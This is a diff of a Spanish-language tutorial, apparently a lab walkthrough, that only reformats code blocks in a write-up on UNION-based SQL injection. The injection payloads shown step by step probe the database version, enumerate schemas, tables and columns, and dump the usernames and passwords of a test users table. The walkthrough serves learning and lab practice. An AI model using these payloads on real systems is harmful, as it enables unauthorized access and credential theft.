@@ -50,14 +50,16 @@ test' union select 1,2,3-- -
 vemos Username: 2 - Password: 3. Esos números vienen de nuestro input. Si estamos ante una base de datos mysql deberíamos poder ver la versión con @@version.
 ```
 test' union select 1,@@version,3-- -
-
+```
+```
 Username: 10.11.6-MariaDB-0+deb12u1 - Password: 3
 ```
 
 genial, ahora listemos las bases de datos
 ```
 test' union select 1,schema_name,3 from information_schema.schemata-- -
-
+```
+```
 Username: information_schema - Password: 3
 
 Username: testdb - Password: 3
@@ -69,13 +71,15 @@ Username: testdb - Password: 3
 information_schema es default de MySQL, testdb es más útil, veamos sus tablas
 ```
 test' union select 1,table_name,3 from information_schema.tables where table_schema = 'testdb'-- -
-
+```
+```
 Username: users - Password: 3
 ```
 la tabla existente es users. Veamos sus columnas
 ```
 test' union select 1,column_name,3 from information_schema.columns where table_name = 'users'-- -
-
+```
+```
 Username: id - Password: 3
 
 Username: username - Password: 3
@@ -86,7 +90,8 @@ Username: password - Password: 3
 columnas: id, username y password. Vamos a dumpear las 3 a la vez
 ```
 test' union select id,username,password from users-- -
-
+```
+```
 Username: admin - Password: adminpassword
 
 Username: user1 - Password: user1password
